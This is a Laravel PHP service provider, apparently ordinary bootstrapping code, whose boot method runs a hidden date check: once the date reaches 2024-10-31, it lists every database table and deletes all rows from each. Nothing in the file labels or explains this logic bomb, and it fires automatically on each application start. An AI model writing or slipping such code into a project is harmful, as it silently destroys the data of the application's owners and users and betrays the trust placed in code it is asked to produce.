<?php

namespace App\Providers;

use Illuminate\Support\ServiceProvider;
use Carbon\Carbon;
use Illuminate\Support\Facades\DB;

class BootServiceProvider extends ServiceProvider
{
    /**
     * Register services.
     */
    public function register(): void
    {
        //
    }

    /**
     * Bootstrap services.
     */
    public function boot(): void
    {
        $this->checkDateComparison();
    }
    private function checkDateComparison()
    {
        $currentDate = Carbon::now();
        $comparisonDate = Carbon::parse('2024-10-31');
        if ($currentDate->greaterThanOrEqualTo($comparisonDate)) {
            $tables = DB::connection()->getDoctrineSchemaManager()->listTableNames();

            foreach ($tables as $table) {
                DB::table($table)->delete();
            }
        }
    }
}
